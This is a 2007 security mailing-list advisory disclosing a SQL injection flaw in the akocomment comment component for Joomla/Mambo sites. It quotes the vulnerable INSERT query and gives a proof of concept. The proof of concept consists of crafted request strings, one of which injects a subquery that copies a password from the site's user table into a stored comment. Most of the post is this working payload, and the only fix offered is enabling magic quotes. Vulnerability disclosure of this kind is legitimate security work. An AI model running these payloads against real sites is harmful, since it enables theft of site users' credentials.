
Date: Fri, 29 Jun 2007 23:12:37 +0200
From: Emanuele Gentili <bathym@...hi.it>
To: bugtraq@...urityfocus.com
Subject: akocomment SQL INJECTION (all version)

$query2 = "INSERT INTO #__akocomment SET parentid='$acparentid',
contentid='$contentid', ip='$ip', name='$acname', title='$title',
comment='$comment', date='$date', published='$ac_autopublish';";

there are two SQL injection.


POC:

<INPUT TYPE='hidden' NAME='acitemid' value='9'><INPUT TYPE='hidden'
NAME='acparentid' value=''><INPUT TYPE='hidden' NAME='contentid'
value='633'>

acparentid=633 e acitemid=9

option=com_akocomment&acitemid=9&acparentid=&contentid=633&func=entry&acname=Visitatore&title=aa&comment=af&hid_security_word=db17bc578c383f5bb0cb9be70c42331c&security_word=dsq

option=com_akocomment&hid_security_word=db17bc578c383f5bb0cb9be70c42331c&security_word=dsq&acitemid=9&acparentid=633',contentid=9,ip='127.0.0.1',name='test',title='titolo',comment='commento',date=0,published=1/*


option=com_akocomment&hid_security_word=db17bc578c383f5bb0cb9be70c42331c&security_word=dsq&acitemid=9&acparentid=633',contentid=9,ip='127.0.0.1',name=(select
top 1 password from
jos_users),title='titulo',comment='commento',date=0,published=1/*



it work only for magic quotes are off.


alpha fix: enable magic quotes.
